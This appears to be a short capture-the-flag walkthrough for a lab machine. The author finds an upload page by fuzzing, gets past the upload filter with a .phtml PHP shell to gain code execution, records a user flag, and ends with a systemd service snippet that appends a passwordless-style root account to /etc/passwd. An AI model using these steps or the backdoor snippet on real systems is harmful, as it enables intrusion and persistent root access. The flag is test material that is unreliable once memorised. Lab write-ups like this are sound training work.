start with nmap scan

port 21,22,445,139,3333 open.

lets start with ftp

***

port 21 ftp

anonymous login is failed.

***

smb

***
wapplyzer

site uses php

***

ffuf the $ip:3333

found `/internal` it has upload file functionality.

first find out where it stored files.

fuzzing `/internal/FUZZ` got `/internal/uploads` where it stores file


try php,php2,php3,php4,phtml. extention to bypass upload restriction. phtml bypass the upload restriction.

upload php shell file. got rce.

got user.txt : 8bd7992fbe8a6ad22a63361004cfcedb



df=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo newroot:exk6ETHR3azEs:0:0:root:/root:/bin/bash >>/etc/passwd"
[Install]
WantedBy=multi-user.target' > $df

create new user and su to new user.